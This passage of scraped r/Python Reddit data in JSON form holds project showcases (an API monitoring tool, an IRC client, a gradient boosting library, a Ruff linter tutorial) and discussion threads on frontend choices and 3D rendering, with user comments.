    "post_title": "A super easy-to-use API monitoring & analytics tool",
    "media": [
        "https://apitally.io/",
        "https://github.com/apitally/python-client",
        "https://docs.apitally.io/frameworks/fastapi"
    ],
    "post_content": "Hey Python community!\nI’d like to introduce you to my indie product Apitally, a simple API monitoring & analytics tool for Python projects.\nWhat My Project Does\nApitally provides insights into API traffic, errors, and performance, for the whole API, each endpoint and individual API consumers. It also monitors API uptime, alerting users when their API is down.\nApitally directly integrates with various Python web frameworks (FastAPI, Django, Flask, Litestar) through middleware, which captures request & response metadata (never anything sensitive!) and asynchronously ships it to Apitally’s servers in regular intervals.\nThe client library is open-source with the source code available on GitHub.\nBelow is a code example, demonstrating how easy it is to set up Apitally for a FastAPI app (see complete setup guide here):\nfrom fastapi import FastAPI\nfrom apitally.fastapi import ApitallyMiddleware\n\napp = FastAPI()\napp.add_middleware(\n    ApitallyMiddleware,\n    client_id=\"your-client-id\",\n    env=\"dev\",  # or \"prod\" etc.\n)\nTarget Audience\nEngineering teams, individual developers and product owners who build, ship and maintain REST APIs in Python.\nComparison\nThe big monitoring platforms (Datadog etc.) can be a bit overwhelming & expensive, particularly for simpler use cases. So Apitally’s key differentiators are simplicity & affordability, with the goal to make it as easy as possible for users to understand usage and performance of their APIs.\nI hope people here find this useful. Please let me know what you think!",
    "comments": [
        {
            "author": "Ran4",
            "score": "2",
            "content": "Looks real good, and integrating it into my fastapi application was really simple. I liked how easy it was to add a user too. Not an option at my company right now though since it doesn't work for springboot (which most of our services is written in) and we'd probably want Microsoft 365 SSO for login. But I'm definitely looking at this in the future.",
            "replies": [
                {
                    "author": "itssimon86",
                    "score": "2",
                    "content": ""
                },
                {
                    "author": "itssimon86",
                    "score": "1",
                    "content": ""
                }
            ]
        },
        {
            "author": "EveryNameIsTaken142",
            "score": "2",
            "content": ""
        }
    ]
},
{
    "post_author": "green9cactus",
    "post_id": "1dhyr23",
    "post_score": "23",
    "post_time": "Monday, June 17, 2024 at 4:58:51 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Advise on choosing UI technology with Python",
    "media": [],
    "post_content": "I am new to python and currently working on simple 3 layer web application -\nfrontend - ?\nbackend API to fetch data from DB - python\nDB - cloud\nThis application has main intention to fetch data from DB, display graphs , table format data etc. also perform some combination analysis of data and show on UI.\nWhich less complex and stable technology I should prefer for frontend ? python flask, Bulma, Mesop by google or any other ? Thank you.",
    "comments": [
        {
            "author": "riklaunim",
            "score": "13",
            "content": "You are mixing up various projects there. If it doesn't have to be a full dashboard for end users you can try Gradio/Streamlit and alike. If you want a better UX / end-user dashboard then you will have to build something good. Flask or any other Python framework to make REST API to then make a SPA JS dashboard with vue, ember or alike JS framework using one of popular dashboard templates like Metronic. If you don't want the extra complexity of JS SPA app then you can make classical web app with views in Django or other framework."
        },
        {
            "author": "drewbert",
            "score": "11",
            "content": "No recommendations on frontend. There are many many quality products for the backend. I would probably choose flask. For the db I would choose sqlalchemy on top of postgres. There's nothing that beats sqlalchemy in terms of ORMs."
        },
        {
            "author": "databot_",
            "score": "4",
            "content": "Streamlit is the best for these types of projects."
        },
        {
            "author": "RevolutionaryPen4661",
            "score": "4",
            "content": "Reflex, the all Python God Framework🔥🔥🔥. It is easy to learn. If you want mature and more complex apps, you can prefer to choose Django (Batteries-Included). reflex.dev Use Chakra UI (from React) https://v2.chakra-ui.com/"
        },
        {
            "author": "GraphicH",
            "score": "3",
            "content": "I like Vue for front end SPAs."
        },
        {
            "author": "recreim",
            "score": "2",
            "content": "If you're new to web dev in general, try Flask or Django for the backend and go with React.js or Vue.js for the frontend. All of them are very common for all types of small and big projects. I don't recommend diving into some fancy stuff at this point. After you've got a good understanding of how to work with those, you can play with something else."
        },
        {
            "author": "Cautious-Ad6043",
            "score": "1",
            "content": "For the frontend consider using HTML + Jinja2 and Vanilla JS"
        },
        {
            "author": "Usual-Instruction-70",
            "score": "1",
            "content": "I love svelte for FE!"
        },
        {
            "author": "tavallaie",
            "score": "1",
            "content": "you can use FastAPI with Pydantic model for getting state from databasse and pass it to front end. if it is a simple dashboard you can use Plotly dash or Streamlit/ Gradio. if you want add more feature you can use flask or django for backend. I prefer to use flask when my db is NoSql and django with SQL dbs. Also if you want something difference from framework above and you are not familiar with React maybe you could give a shot to HTMX."
        }
    ]
},
{
    "post_author": "rmpython",
    "post_id": "1ddnhs7",
    "post_score": "4",
    "post_time": "Tuesday, June 11, 2024 at 10:57:59 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Textchat: TUI Single Server IRC Client",
    "media": [
        "https://github.com/rmblau/textchat/"
    ],
    "post_content": "Hello all! I have made an irc client with textual`. Source is available here: https://github.com/rmblau/textchat/\nI would love any and all feedback on code quality and how it can be improved as well as people to test out the client. On first launch it will open a settings screen where you can input your user information once you hit the save button. Right now there's a bug that I'm working on resolving where that you'll have to quit the application once you enter your information and relaunch it to get it to connect. Feel free to file issues and contribute; I hope you all will find this fun and interesting!\nWhat My Project Does\nOnly confirmed working on Linux right now.. Right now it does not support SASL, SSL, or znc. It's in alpha and can be installed from pypi. Once installed it can be ran from the cmd line with `textchat`\nTarget Audience\nThis is aimed at people who love irc as much as I do.\nComparison\nThere didn't seem to be any application like this so I decided to make it.",
    "comments": [
        {
            "author": "Zealousideal-Song-75",
            "score": "0",
            "content": "Interesting I will check it out and possibly integrate it with SCOUT-2 which is my open source AI digital assistant application. I gave you a star and a watch. https://github.com/DigitalHallucinations/SCOUT-2",
            "replies": [
                {
                    "author": "rmpython",
                    "score": "0",
                    "content": "That's awesome, thank you! Also have given you a star :)"
                }
            ]
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1dg4zxe",
    "post_score": "4",
    "post_time": "Saturday, June 15, 2024 at 3:00:13 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Saturday Daily Thread: Resource Request and Sharing! Daily Thread",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "rahul505021",
            "score": "1",
            "content": "Where to get open source contribution guide or mentor"
        }
    ]
},
{
    "post_author": "PossiblePandaYT",
    "post_id": "1dcwu86",
    "post_score": "0",
    "post_time": "Tuesday, June 11, 2024 at 12:15:17 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "EFT - A file extension for implementing user created themes",
    "media": [
        "https://github.com/PossiblePanda/EFT-py"
    ],
    "post_content": "What my project does\nAllow developers to implement custom themes into their programs, while having a file format that is human readable\nExample:\nmy_theme.eft\n- My Theme\n\nbackground_color : 255,255,255 : Color\ntitle : \"Hi\" : String\nnumber : 5 : Int\nenabled : true : Bool\nTarget Audience\nDevelopers & users who make themes\nComparison\nCSS Themes - May be difficult to implement, difficult to understand for people who aren't programmers\nJSON Themes - Viable option, may not be readable in some cases\nGitHub: https://github.com/PossiblePanda/EFT-py\nContributors are greatly appreciated :)\nIf you have questions feel free to ask",
    "comments": [
        {
            "author": "bjorneylol",
            "score": "15",
            "content": "This is just yaml with added steps",
            "replies": [
                {
                    "author": "PossiblePandaYT",
                    "score": "-9",
                    "content": ""
                }
            ]
        },
        {
            "author": "turtle4499",
            "score": "9",
            "content": "Pick a very different name lol. EFT is like 85 used terms already most of which are banking, healthcare and logistics.",
            "replies": [
                {
                    "author": "PossiblePandaYT",
                    "score": "1",
                    "content": "Honestly yeah, the name could use a bit of work. EFT stands for \"Easily Formattable Theme\", which doesn't really roll off of the tongue very well"
                }
            ]
        },
        {
            "author": "Eye_Of_Forrest",
            "score": "1",
            "content": "escape from tarkov theme? amazing",
            "replies": [
                {
                    "author": "PossiblePandaYT",
                    "score": "1",
                    "content": "🗣️"
                }
            ]
        }
    ]
},
{
    "post_author": "ogMasterPloKoon",
    "post_id": "1dft2qf",
    "post_score": "12",
    "post_time": "Friday, June 14, 2024 at 6:07:54 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "My first Python package, D1py: A very simple library to interact with Cloudflare D1 Database API ",
    "media": [
        "https://github.com/Suleman-Elahi/D1py"
    ],
    "post_content": "What My Project Does\nCloudflare offers a free SQLite based database D1. I needed it for some personal project so I thought of creating a very simple wrapper for it. D1py let's you connect to D1 database in your cloudflare account and run SQL queries(CRUD operations).\nTarget audience\nFor those who need a simple wrapper for Cloudflare D1 API for their projects.\nComparison\nRight now there are no Python wrappers or libraries for D1 yet.... that's why I thought of creating one. It's not perfect but it is my first attempt at writing a small library/package for doing a task.\nSource\nRepository: https://github.com/Suleman-Elahi/D1py\nFeel free to drop any suggestions. Thanks.",
    "comments": [
        {
            "author": "sophia_l_internat",
            "score": "5",
            "content": "This is great! My first impression is very good. The readme is clear and detailed, which is a great starting point. You are already doing tests, which is also a great point. The biggest feedback I think is fairly obvious: it needs way more features. This is the foundation, but you need many more functionalities to make it worth it for people to use. Good luck! 😊😊",
            "replies": [
                {
                    "author": "ogMasterPloKoon",
                    "score": "1",
                    "content": "Thank you."
                }
            ]
        }
    ]
},
{
    "post_author": "mutlu_simsek",
    "post_id": "1dfrpzk",
    "post_score": "10",
    "post_time": "Friday, June 14, 2024 at 5:08:28 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Perpetual - a self-generalizing, hyperparameter-free gradient boosting machine",
    "media": [
        "https://github.com/perpetual-ml/perpetual",
        "https://scikit-learn.org/stable/modules/generated/sklearn.datasets.fetch_california_housing.html"
    ],
    "post_content": "https://github.com/perpetual-ml/perpetual\nWhat My Project Does\nPerpetualBooster is a gradient boosting machine (GBM) algorithm which doesn't have hyperparameters to be tuned so that you can use it without needing hyperparameter optimization packages unlike other GBM algorithms. Similar to AutoML libraries, it has a budget parameter which ranges between (0, 1). Increasing the budget parameter increases predictive power of the algorithm and gives better results on unseen data. Start with a small budget and increase it once you are confident with your features. If you don't see any improvement with further increasing budget, it means that you are already extracting the most predictive power out of your data.\nTarget Audience\nThe project is meant for production. You can replace hyperparameter packages plus other gradient boosting algorithms with PerpetualBooster.\nComparison\nOther gradient boosting algorithms (XGBoost, LightGBM, Catboost) and most of the machine learning algorithms need hyperparameter optimization for the best performance on unseen data. But PerpetualBooster doesn't have hyperparameters so it doesn't need hyperparameter tuning. It has a built-in generalization algorithm and provides the best performance.\nThe following table summarizes the results for the California Housing dataset:\nPerpetual budget LightGBM n_estimators Perpetual mse LightGBM mse Perpetual cpu time LightGBM cpu time Speed-up\n0.33 100 0.192 0.192 10.1 990 98x\n0.35 200 0.190 0.191 11.0 2030 186x\n0.45 300 0.187 0.188 18.7 3272 179x",
    "comments": [
        {
            "author": "Stochastic_berserker",
            "score": "2",
            "content": "Show us a white paper and it is easier to analyze. But a quick look in trees.rs shows you are using hyperparameters. Why is that?",
            "replies": [
                {
                    "author": "mutlu_simsek",
                    "score": "1",
                    "content": ""
                }
            ]
        },
        {
            "author": "mutlu_simsek",
            "score": "1",
            "content": "",
            "replies": [
                {
                    "author": "reckless_commenter",
                    "score": "2",
                    "content": ""
                }
            ]
        }
    ]
},
{
    "post_author": "dome271",
    "post_id": "j2ai2r",
    "post_score": "3204",
    "post_time": "Wednesday, September 30, 2020 at 2:12:54 AM GMT+3",
    "flair_text": "",
    "post_title": "I released the Code for the Instagram DeepFake Bot!",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "CartmansEvilTwin",
            "score": "333",
            "content": "Coincidentally, that anchor (Jan Hofer) just announced his retirement, but with this project, we can simply replace him."
        },
        {
            "author": "dome271",
            "score": "261",
            "content": "So many people asked about releasing the code, so I decided to make a new post. https://github.com/dome272/Instagram-DeepFake-Bot"
        },
        {
            "author": "GarrySnailGhost",
            "score": "28",
            "content": "this is so scary tbh",
            "replies": [
                {
                    "author": "YmFzZTY0dXNlcm5hbWU_",
                    "score": "18",
                    "content": "If it's any consolation, (I think) Microsoft recently announced deepfake detection software that works pretty well."
                }
            ]
        },
        {
            "author": "ELAMAYEYO",
            "score": "39",
            "content": "Amazing deep fake bot! What's the music tho??"
        }
    ]
},
{
    "post_author": "BluesFiend",
    "post_id": "1dftrbu",
    "post_score": "3",
    "post_time": "Friday, June 14, 2024 at 6:36:44 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Problem details for FastAPI applications (RFC9457)",
    "media": [
        "https://github.com/NRWLDev/fastapi-problem",
        "https://pypi.org/project/fastapi-problem/",
        "https://github.com/NRWLDev/rfc9457",
        "https://pypi.org/project/rfc9457/",
        "https://nrwldev.github.io/fastapi-problem/"
    ],
    "post_content": "Just released v0.8.0 of fastapi_problem to provide problem details for FastAPI applications. Hoping it can provide value to some other peoples projects.\nCode: https://github.com/NRWLDev/fastapi-problem\nDocs: https://nrwldev.github.io/fastapi-problem/\nPypi: https://pypi.org/project/fastapi-problem/\nWhat My Project Does\nProvides a simple exception handler and an underlying exception class heirarchy to remove the need to think about error management in your FastAPI project, just raise errors as appropriate and let the handler deal with responses.\nTarget Audience\nWeb developers\nComparison\nThere was a previous project that supported RFC7807 but that is no longer maintained, and is also made obsolete by RFC9457.\nRFC9457\nFor anyone who does not make use of FastAPI, the underlying exception library has also been released, and can be used to implement handlers for any web framework you might be into.\nhttps://github.com/NRWLDev/rfc9457\nhttps://pypi.org/project/rfc9457/",
    "comments": [
        {
            "author": "riksi",
            "score": "2",
            "content": "What about when you have multiple errors (think form submission)? What about when the field that errored is nested ? Like {field1: [{field2: wrong_value}]} ? Does it support nested fields & multiple errors?",
            "replies": [
                {
                    "author": "BluesFiend",
                    "score": "1",
                    "content": "That is generally handled by fastapi's RequestValidationError, but if you had some custom validation that happened outside of that flow, you can provide custom keyword arguments on raise (or a dict with nested information) that would be included in the response for that raised instance. Mentioned in the docs, here: https://nrwldev.github.io/fastapi-problem/error/#custom-errors"
                }
            ]
        },
        {
            "author": "zonex00",
            "score": "0",
            "content": "",
            "replies": [
                {
                    "author": "BluesFiend",
                    "score": "1",
                    "content": ""
                },
                {
                    "author": "BluesFiend",
                    "score": "1",
                    "content": ""
                }
            ]
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1dicxw6",
    "post_score": "2",
    "post_time": "Tuesday, June 18, 2024 at 3:00:08 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Tuesday Daily Thread: Advanced questions",
    "media": [],
    "post_content": "Daily Thread",
    "comments": []
},
{
    "post_author": "PossiblePandaYT",
    "post_id": "1dcwu86",
    "post_score": "0",
    "post_time": "Tuesday, June 11, 2024 at 12:15:17 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "EFT - A file extension for implementing user created themes",
    "media": [
        "https://github.com/PossiblePanda/EFT-py"
    ],
    "post_content": "What my project does\nAllow developers to implement custom themes into their programs, while having a file format that is human readable\nExample:\nmy_theme.eft\n- My Theme\n\nbackground_color : 255,255,255 : Color\ntitle : \"Hi\" : String\nnumber : 5 : Int\nenabled : true : Bool\nTarget Audience\nDevelopers & users who make themes\nComparison\nCSS Themes - May be difficult to implement, difficult to understand for people who aren't programmers\nJSON Themes - Viable option, may not be readable in some cases\nGitHub: https://github.com/PossiblePanda/EFT-py\nContributors are greatly appreciated :)\nIf you have questions feel free to ask",
    "comments": [
        {
            "author": "bjorneylol",
            "score": "15",
            "content": "This is just yaml with added steps",
            "replies": [
                {
                    "author": "PossiblePandaYT",
                    "score": "-9",
                    "content": "",
                    "replies": [
                        {
                            "author": "nekokattt",
                            "score": "5",
                            "content": "https://xkcd.com/927/",
                            "replies": [
                                {
                                    "author": "PossiblePandaYT",
                                    "score": "1",
                                    "content": "ok"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "turtle4499",
            "score": "9",
            "content": "Pick a very different name lol. EFT is like 85 used terms already most of which are banking, healthcare and logistics.",
            "replies": [
                {
                    "author": "PossiblePandaYT",
                    "score": "1",
                    "content": "Honestly yeah, the name could use a bit of work. EFT stands for \"Easily Formattable Theme\", which doesn't really roll off of the tongue very well",
                    "replies": [
                        {
                            "author": "PriorTrick",
                            "score": "5",
                            "content": "Maybe just “easy-theme”",
                            "replies": [
                                {
                                    "author": "PossiblePandaYT",
                                    "score": "1",
                                    "content": "Could work, I don't like .ET though"
                                }
                            ]
                        },
                        {
                            "author": "turtle4499",
                            "score": "1",
                            "content": "It’s alright I just have major ptsd about sitting on hold with the electronic funds transfer department of an insurance company while trying to get a hold of the electronic file transfer department (usually called edi but was sworn to me to be eft).",
                            "replies": [
                                {
                                    "author": "PossiblePandaYT",
                                    "score": "0",
                                    "content": "LOL"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "Eye_Of_Forrest",
            "score": "1",
            "content": "escape from tarkov theme? amazing",
            "replies": [
                {
                    "author": "PossiblePandaYT",
                    "score": "1",
                    "content": "🗣️"
                }
            ]
        }
    ]
},
{
    "post_author": "jrmiranda",
    "post_id": "hb108j",
    "post_score": "3131",
    "post_time": "Thursday, June 18, 2020 at 12:51:40 AM GMT+3",
    "flair_text": "I Made This",
    "post_title": "I made a ray tracer that simulates curved spacetime by using Einstein's field equations from general relativity. Here's a black hole!",
    "media": [
        "https://i.redd.it/yrcat3ndkj551.jpg",
        "https://preview.redd.it/yrcat3ndkj551.jpg?auto=webp&s=c70ba4e6d30f7a30e44312369af59fa44bf1b03b"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "CrispyNipsy",
            "score": "444",
            "content": "And here I am, just trying to get a margin on my image without it fucking with my border radius..."
        },
        {
            "author": "AnonMurphy",
            "score": "148",
            "content": "We need a link to proof or something, cause this just looks like a screenshot from the movie Interstellar."
        },
        {
            "author": "[deleted]",
            "score": "16",
            "content": "Happy gargantua noises"
        },
        {
            "author": "TriG-tbh",
            "score": "37",
            "content": "I noticed that in the actual black hole, there's a thin 1px line of light similar to the outside of the black hole. What exactly causes this?"
        },
        {
            "author": "[deleted]",
            "score": "12",
            "content": "This is the best science or nuclear science thingy I've ever seen on this subreddit. Awesome OP. can't wait to see how the code works."
        },
        {
            "author": "k0042n",
            "score": "19",
            "content": "Can't wait to see the code that makes the this gorgeous art"
        },
        {
            "author": "virtualadept",
            "score": "16",
            "content": "Awesome! Nifty bit of Python there. Nice work."
        },
        {
            "author": "jrmiranda",
            "score": "8",
            "content": "Hey guys, thank you for your kind words(and for the gold). I trully appreciated the feedback! Here's the code: https://github.com/jrmiranda/blackhole_raytracer. Enjoy!"
        },
        {
            "author": "alemanimani",
            "score": "7",
            "content": "I cloooseee my eyeees and she slips aawaaaaaaaaaay"
        }
    ]
},
{
    "post_author": "MaKaNuReddit",
    "post_id": "1dfzuyr",
    "post_score": "1",
    "post_time": "Friday, June 14, 2024 at 11:02:51 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "I tried to explain python imports",
    "media": [
        "https://github.com/MaKaNu/pyimport-explained"
    ],
    "post_content": "When I was a beginner (or maybe still I am) I struggled a lot with pythons import function.\nOver the years I went over different approaches, how to handle imports and ended up using mostly exclusive poetry.\nI've met a lot of people struggling the same way, bit always could just explain very shortly my experience.\nI've now decided to write it down as a scenario, where I can show and explain my pitfalls:\nhttps://github.com/MaKaNu/pyimport-explained",
    "comments": [
        {
            "author": "VindicoAtrum",
            "score": "3",
            "content": "This is good, and I don't mean to detract from it, but honestly just use Poetry and scripts. I'd suggest extending this with Poetry.",
            "replies": [
                {
                    "author": "MaKaNuReddit",
                    "score": "2",
                    "content": "Test 06 Not written down until now, but the test exists already"
                }
            ]
        }
    ]
},
{
    "post_author": "ajpinedam",
    "post_id": "1disz53",
    "post_score": "0",
    "post_time": "Tuesday, June 18, 2024 at 6:08:21 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "Ruff: A Modern Python Linter for Error-Free and Maintainable Code",
    "media": [
        "https://realpython.com/ruff-python/"
    ],
    "post_content": "Linting is essential to writing clean and readable code to share with others. A linter, like Ruff, is a tool that analyzes your code and looks for errors, stylistic issues, and suspicious constructs. Linting allows you to address issues and improve your code quality before you commit your code and share it with others.\nRuff is a modern linter that’s extremely fast and has a simple interface, making it straightforward to use. It also aims to be a drop-in replacement for many other linting and formatting tools, such as Flake8, isort, and Black. It’s quickly becoming one of the most popular Python linters.\nInstalling Ruff\nNow that you know why linting your code is important and how Ruff is a powerful tool for the job, it’s time to install it. Thankfully, Ruff works out of the box, so no complicated installation instructions or configurations are needed to start using it.\nAssuming your project is already set up with a virtual environment, you can install Ruff in the following ways:\n```bash\n$ python -m pip install ruff\n```\n\nYou can check that Ruff installed correctly by using the ruff version command:\n\n```bash\n$ ruff version\nruff 0.4.7\n```\nLinting Your Python Code\nWhile linting helps keep your code consistent and error-free, it doesn’t guarantee that your code will be bug-free. Finding the bugs in your code is best handled with a debugger and adequate testing, which won’t be covered in this tutorial. Coming up in the next sections, you’ll learn how to use Ruff to check for errors and speed up your workflow.\nChecking for Errors\n```bash\n$ ruff check\none_ring.py:1:8: F401 [*] `os` imported but unused\none_ring.py:10:12: F821 Undefined name `name`\nFound 2 errors.\n[*] 1 fixable with the `--fix` option.\n```\nSuccess! Ruff found two errors. Not only does it show the file and line numbers of the errors, but it also gives you error codes and messages. In addition, it lets you know that one of the two errors is fixable. Great!\nYou can tell Ruff to fix errors by applying the --fix flag. Here’s what happens when you follow its suggestion:\n```bash\n$ ruff check --fix\none_ring.py:9:12: F821 Undefined name `name`\nFound 2 errors (1 fixed, 1 remaining).\n```\nYou can find the rest of this Free tutorial here",
    "comments": [
        {
            "author": "CanadianBuddha",
            "score": "17",
            "content": "My big problem with `ruff`is that `ruff format` will sometimes reformat a .py file in a way that `ruff check` considers invalid. This is a known problem that the devs don't plan to fix. This problem occurs because sometimes `ruff format` will output a line of code that contains more characters than it was told to limit any line to. When this happens then `ruff check` considers the file to be invalidly formatted and `ruff check --fix` will fix it but then the next time you run `ruff format` on that file, it will unfix it again.",
            "replies": [
                {
                    "author": "Doobeewoo",
                    "score": "6",
                    "content": "We fixed the issue by disabling the linter rule knowing the formatter will handle it. We already did that with Black and other linters before. But Ruff replaced them all. Only one configuration and it's fast! I would never go back."
                },
                {
                    "author": "redbo",
                    "score": "2",
                    "content": "Yes, I deal with this as well. I’m going to try turning off the line length check and do a separate “make sure format doesn’t do anything” check."
                },
                {
                    "author": "bobsbitchtitz",
                    "score": "5",
                    "content": "lol that right there sold me on never using it"
                }
            ]
        },
        {
            "author": "hoodies_are_comfy",
            "score": "10",
            "content": "I’ve been using Ruff for about a year now. I’ve been having problems with it ignoring my ruff.toml occasionally inside CI/CD. No idea why.",
            "replies": [
                {
                    "author": "mikat7",
                    "score": "3",
                    "content": "Same, but you can pass the config file as an optional parameter to fix that"
                }
            ]
        },
        {
            "author": "CrwdsrcEntrepreneur",
            "score": "2",
            "content": "How does it compare to black? I've been using a combo of black and flake8 for years and it gets the job done. Gotten very used to it.",
            "replies": [
                {
                    "author": "striata",
                    "score": "7",
                    "content": "It advertises drop-in parity for both, so replacing them should simply speed up your formatting/linting by a huge factor. I also really like the simplicity of the single ruff binary."
                },
                {
                    "author": "XUtYwYzz",
                    "score": "1",
                    "content": "Ruff is fast enough to run on keystroke and combines the functionality of multiple tools. From the ruff docs “Ruff can be used to replace Flake8 (plus dozens of plugins), Black, isort, pydocstyle, pyupgrade, autoflake, and more”."
                }
            ]
        },
        {
            "author": "yrubooingmeimryte",
            "score": "1",
            "content": "We know. You don’t need to keep trying to sell us on this."
        }
    ]
},
{
    "post_author": "rmpython",
    "post_id": "1ddnhs7",
    "post_score": "4",
    "post_time": "Tuesday, June 11, 2024 at 10:57:59 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Textchat: TUI Single Server IRC Client",
    "media": [
        "https://github.com/rmblau/textchat/"
    ],
    "post_content": "Hello all! I have made an irc client with textual`. Source is available here: https://github.com/rmblau/textchat/\nI would love any and all feedback on code quality and how it can be improved as well as people to test out the client. On first launch it will open a settings screen where you can input your user information once you hit the save button. Right now there's a bug that I'm working on resolving where that you'll have to quit the application once you enter your information and relaunch it to get it to connect. Feel free to file issues and contribute; I hope you all will find this fun and interesting!\nWhat My Project Does\nOnly confirmed working on Linux right now.. Right now it does not support SASL, SSL, or znc. It's in alpha and can be installed from pypi. Once installed it can be ran from the cmd line with `textchat`\nTarget Audience\nThis is aimed at people who love irc as much as I do.\nComparison\nThere didn't seem to be any application like this so I decided to make it.",
    "comments": [
        {
            "author": "Zealousideal-Song-75",
            "score": "0",
            "content": "Interesting I will check it out and possibly integrate it with SCOUT-2 which is my open source AI digital assistant application. I gave you a star and a watch. https://github.com/DigitalHallucinations/SCOUT-2",
            "replies": [
                {
                    "author": "rmpython",
                    "score": "0",
                    "content": "That's awesome, thank you! Also have given you a star :)"
                }
            ]
        }
    ]
},
{
    "post_author": "jcoelho93",
    "post_id": "1dbyrs2",
    "post_score": "3",
    "post_time": "Sunday, June 9, 2024 at 8:12:52 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "steer - An interactive CLI tool to write json and yaml file from JSON schemas",
    "media": [
        "https://github.com/jcoelho93/steer"
    ],
    "post_content": "What my project does:\nIt's an interactive tool to help you write json or yaml based on a JSON schema. I built this because I thought it would be helpful to write values.yaml files for Helm charts. But it can be used for a lot of other things like CICD configuration, OpenAPI specifications, etc.\nTarget Audience\nDevelopers mostly, I guess\nComparison\nI haven't seen anything similar to this. Except maybe spotlight for writing OpenAPI specs, except steer is from the command line.\nCode:\nHere's the GitHub repo https://github.com/jcoelho93/steer",
    "comments": [
        {
            "author": "bobsbitchtitz",
            "score": "1",
            "content": "The sample doesn't really show how this could be useful.",
            "replies": [
                {
                    "author": "jcoelho93",
                    "score": "2",
                    "content": "Thanks for the feedback, I'll work on it."
                }
            ]
        }
    ]
},
{
    "post_author": "sonobanana33",
    "post_id": "1df7w7f",
    "post_score": "40",
    "post_time": "Thursday, June 13, 2024 at 10:48:06 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "a new version of ultimateultimateguitar",
    "media": [
        "https://github.com/ltworf/ultimateultimateguitar",
        "https://codeberg.org/ltworf/ultimateultimateguitar",
        "https://youtu.be/Spm1IIaYo8Q"
    ],
    "post_content": "What My Project Does\nIt is a CLI to get songs from ultimateguitar.\nHow it looks like: https://youtu.be/Spm1IIaYo8Q\nI've only tried it on linux.\nAvailable in debian and pypi.\nTarget audience\nFor musicians who also use the terminal and who don't especially like the ultimateguitar website.\nComparison\nI'm not aware of other projects doing the same thing.\nCompared to the website, it can transpose and it is much faster.\nSource\nProject website: https://codeberg.org/ltworf/ultimateultimateguitar\nOut of date website (just here to avoid the post to be auto-removed): https://github.com/ltworf/ultimateultimateguitar",
    "comments": [
        {
            "author": "VoodooMamaJuuju",
            "score": "3",
            "content": "This is great. Takes me back to the old days of UG"
        },
        {
            "author": "sophia_l_internat",
            "score": "2",
            "content": "I love it! Small suggestions for improvements, in case it's useful: The readme is too sparse, it does not give a good overview. I would add 1 or 2 screenshots. The \"Requirements\" section feels wrong, since it just redirects to the file. I would say either remvoe it entirely or flesh it out further. I am only saying that because it gives a subpar first impression to your great project! First impressions matter 😉😉",
            "replies": [
                {
                    "author": "sonobanana33",
                    "score": "1",
                    "content": "Yeah this project is a bit old, but I released it for real just recently."
                }
            ]
        },
        {
            "author": "PM_me_butts666",
            "score": "3",
            "content": "wicked! i’m going to check this out later tonight"
        },
        {
            "author": "warmarin",
            "score": "1",
            "content": "awesome!! thank you"
        }
    ]
},
{
    "post_author": "Latter-History-8053",
    "post_id": "1dhudt2",
    "post_score": "5",
    "post_time": "Monday, June 17, 2024 at 12:57:08 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Advice for creating 3D modelling program",
    "media": [],
    "post_content": "I am creating a Python program which models 3D shapes so that they can be saved and or interacted with (i.e. rotated). The process currently takes a while to render shapes consisting of multiple materials. The libraries being implemented are currently matplotlib and numpy. What would you advise for improving the rendering process (library choice etc)?",
    "comments": [
        {
            "author": "thisdude415",
            "score": "12",
            "content": "I question whether matplotlib is the right library for this… I don’t know the proper one, but i doubt it’s matplotlib"
        },
        {
            "author": "CeruleanBoolean141",
            "score": "6",
            "content": "PyOpenGL is what I use for procedurally generating 3D models. A bit of a learning curve, but it’s fast."
        },
        {
            "author": "hisnamewasnot",
            "score": "2",
            "content": "Ever try ChimeraX?"
        },
        {
            "author": "billsil",
            "score": "2",
            "content": "I use Vtk. It’s orders of magnitude faster than matplotlib for 3d rendering, has a numpy api, and is pretty with a fringe map. It’s used in Paraview (same group as Vtk and cmake), Ansys Mechanical and many other commercial tools."
        },
        {
            "author": "mrmrn121",
            "score": "1",
            "content": "I would say this video and the channel itself is the best place to start: https://youtu.be/M_Hx0g5vFko?si=jS2h_IR1MzkmU2Q5"
        },
        {
            "author": "Patman52",
            "score": "1",
            "content": "Pyvista works pretty good for creating and rendering 3D shapes"
        },
        {
            "author": "I_will_delete_myself",
            "score": "1",
            "content": "If you are trying to create Blender but in Python (Which it technically has bindings with its scripting api), you are going have to use a graphics spec like OpenGL, Vulkan, or something like VTK. PyOpenGL is a good start. Now if you are just trying to look at it and nothing else, there are many libraries you are ok with."
        },
        {
            "author": "Fearless-Recipe-680",
            "score": "1",
            "content": "FreeCAD is Python based, but I never looked at the details of what libraries it makes use of."
        },
        {
            "author": "zonex00",
            "score": "1",
            "content": "There is a new python library that doesn’t get enough love: It uses webgpu as the backend (fast + modern) The library is called pygfx (threejs of the python world) https://github.com/pygfx/pygfx"
        }
    ]
},
{
    "post_author": "qabr",
    "post_id": "1dbm916",
    "post_score": "0",
    "post_time": "Sunday, June 9, 2024 at 8:23:35 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Request to journalists: no snakes",
    "media": [],
    "post_content": "Could you please stop using photos of snakes on your articles about Python?\nNot only is it unimaginative, stale, and cliché, but many of us also find it genuinely off-putting. Our passion certainly lies in coding, not necessarily in reptiles.\nP.S. Imagine 9 out of 10 articles on Windows featuring photos of pretty youknowwhat",
    "comments": [
        {
            "author": "Peiple",
            "score": "89",
